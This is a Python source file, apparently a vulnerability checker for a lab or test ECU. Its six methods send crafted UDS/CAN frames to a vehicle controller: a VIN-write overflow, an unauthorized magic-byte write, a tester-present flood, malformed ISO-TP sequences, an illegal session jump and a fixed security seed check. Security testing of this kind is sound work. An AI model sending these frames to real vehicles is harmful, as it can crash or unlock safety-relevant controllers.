import time
import can
from uds_controller import UDSController

class VulnerabilityScanner(UDSController):
    def test_v1_vin_overflow(self):
        payload = bytes([0x2E, 0xF1, 0x90]) + (b"\xFF" * 25)
        self.send_recv(payload, timeout=0.2)
        time.sleep(1)
        return not self.check_alive()

    def test_v2_magic_byte(self):
        payload = bytes([0x2E, 0x01, 0x01, 0xAA, 0x11, 0x22])
        resp = self.send_recv(payload)
        return resp and resp[0] == 0x6E

    def test_v3_resource_exhaustion(self, rx_id=0x7E0):
        for _ in range(200):
            msg = can.Message(arbitration_id=rx_id, data=[0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
            self.bus.send(msg)
            time.sleep(0.01)
        return not self.check_alive()

    def test_v4_isotp_overlap(self, rx_id=0x7E0):
        ff = can.Message(arbitration_id=rx_id, data=[0x10, 0x14, 0x2E, 0xF1, 0x90, 0x00, 0x00, 0x00], is_extended_id=False)
        self.bus.send(ff)
        for sn in [0x21, 0x22, 0x22, 0x23]:
            time.sleep(0.02)
            self.bus.send(can.Message(arbitration_id=rx_id, data=[sn, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA], is_extended_id=False))
        time.sleep(1)
        return not self.check_alive()

    def test_v5_session_leak(self):
        self.send_recv(bytes([0x10, 0x01]))
        resp = self.send_recv(bytes([0x10, 0x02]))
        return resp and resp[0] == 0x50 and resp[1] == 0x02

    def test_v6_weak_seed(self):
        resp = self.send_recv(bytes([0x27, 0x01]))
        return resp and resp.hex().upper().endswith("DEADBEEF")
